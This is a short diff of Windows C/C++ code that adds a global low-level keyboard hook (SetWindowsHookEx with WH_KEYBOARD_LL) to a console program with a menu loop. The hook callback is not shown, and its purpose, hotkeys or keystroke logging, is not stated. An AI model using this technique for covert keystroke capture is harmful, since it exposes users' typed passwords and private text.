@@ -103,6 +103,13 @@ int main(int argc, char* argv[]) {
     window = FindWindowA("ConsoleWindowClass", NULL);
 
     bool showMenu = true;
+    
+        /* Initialising the HHOOK */
+    if (!SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0)) {
+		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+	} else {
+        puts("Hook Successful!\n");
+    }
 
     while(1) {
         if(showMenu) { 
